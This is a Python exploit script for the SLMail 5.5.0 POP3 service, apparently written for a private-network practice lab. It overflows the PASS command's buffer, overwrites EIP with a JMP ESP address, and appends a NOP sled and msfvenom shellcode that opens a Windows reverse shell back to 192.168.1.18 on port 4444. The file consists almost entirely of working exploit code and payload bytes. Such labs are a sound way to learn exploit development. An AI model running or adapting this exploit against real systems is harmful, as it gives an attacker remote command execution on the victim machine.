#!/usr/bin/python3
# Exploit by x41 - v2.0 - SLMail 5.5.0

# Import of the socket library to connect to the POP3 service
import socket

# Victim IP and Port
host = "192.168.1.14"
port = 110

# BufferOverflow
junk = b'A' * 4654
eip = b'\x8F\x35\x4A\x5F'
nop = b'\x90' * 20

# Shellcode (msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.1.18 LPORT=4444 -b '\x00\x0a\x0d' EXITFUNC=thread -f python)
buf =  b""
buf += b"\xbf\x51\x96\x1e\x51\xd9\xcc\xd9\x74\x24\xf4\x58\x31"
buf += b"\xc9\xb1\x52\x31\x78\x12\x83\xe8\xfc\x03\x29\x98\xfc"
buf += b"\xa4\x35\x4c\x82\x47\xc5\x8d\xe3\xce\x20\xbc\x23\xb4"
buf += b"\x21\xef\x93\xbe\x67\x1c\x5f\x92\x93\x97\x2d\x3b\x94"
buf += b"\x10\x9b\x1d\x9b\xa1\xb0\x5e\xba\x21\xcb\xb2\x1c\x1b"
buf += b"\x04\xc7\x5d\x5c\x79\x2a\x0f\x35\xf5\x99\xbf\x32\x43"
buf += b"\x22\x34\x08\x45\x22\xa9\xd9\x64\x03\x7c\x51\x3f\x83"
buf += b"\x7f\xb6\x4b\x8a\x67\xdb\x76\x44\x1c\x2f\x0c\x57\xf4"
buf += b"\x61\xed\xf4\x39\x4e\x1c\x04\x7e\x69\xff\x73\x76\x89"
buf += b"\x82\x83\x4d\xf3\x58\x01\x55\x53\x2a\xb1\xb1\x65\xff"
buf += b"\x24\x32\x69\xb4\x23\x1c\x6e\x4b\xe7\x17\x8a\xc0\x06"
buf += b"\xf7\x1a\x92\x2c\xd3\x47\x40\x4c\x42\x22\x27\x71\x94"
buf += b"\x8d\x98\xd7\xdf\x20\xcc\x65\x82\x2c\x21\x44\x3c\xad"
buf += b"\x2d\xdf\x4f\x9f\xf2\x4b\xc7\x93\x7b\x52\x10\xd3\x51"
buf += b"\x22\x8e\x2a\x5a\x53\x87\xe8\x0e\x03\xbf\xd9\x2e\xc8"
buf += b"\x3f\xe5\xfa\x5f\x6f\x49\x55\x20\xdf\x29\x05\xc8\x35"
buf += b"\xa6\x7a\xe8\x36\x6c\x13\x83\xcd\xe7\xdc\xfc\xcc\xe5"
buf += b"\xb4\xfe\xce\x18\x19\x76\x28\x70\xb1\xde\xe3\xed\x28"
buf += b"\x7b\x7f\x8f\xb5\x51\xfa\x8f\x3e\x56\xfb\x5e\xb7\x13"
buf += b"\xef\x37\x37\x6e\x4d\x91\x48\x44\xf9\x7d\xda\x03\xf9"
buf += b"\x08\xc7\x9b\xae\x5d\x39\xd2\x3a\x70\x60\x4c\x58\x89"
buf += b"\xf4\xb7\xd8\x56\xc5\x36\xe1\x1b\x71\x1d\xf1\xe5\x7a"
buf += b"\x19\xa5\xb9\x2c\xf7\x13\x7c\x87\xb9\xcd\xd6\x74\x10"
buf += b"\x99\xaf\xb6\xa3\xdf\xaf\x92\x55\x3f\x01\x4b\x20\x40"
buf += b"\xae\x1b\xa4\x39\xd2\xbb\x4b\x90\x56\xdb\xa9\x30\xa3"
buf += b"\x74\x74\xd1\x0e\x19\x87\x0c\x4c\x24\x04\xa4\x2d\xd3"
buf += b"\x14\xcd\x28\x9f\x92\x3e\x41\xb0\x76\x40\xf6\xb1\x52"

# Build exploit buffer out of the junk data ('A's), eip containing 'JMP ESP', NOPs and shellcode
buffer = junk + eip + nop + buf

# Build a TCP SOCKET (stream) and use it to connect to victim IP & Port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
data = s.recv(1024)
print(data)

# Send USER command with Username x41
s.send(b'USER x41\r\n')
data = s.recv(1024)
print(data)

# Send PASS command with our buffer
s.send(b'PASS ' + buffer + b'\r\n')
data = s.recv(1024)
print(data)

# Close connection
s.close()
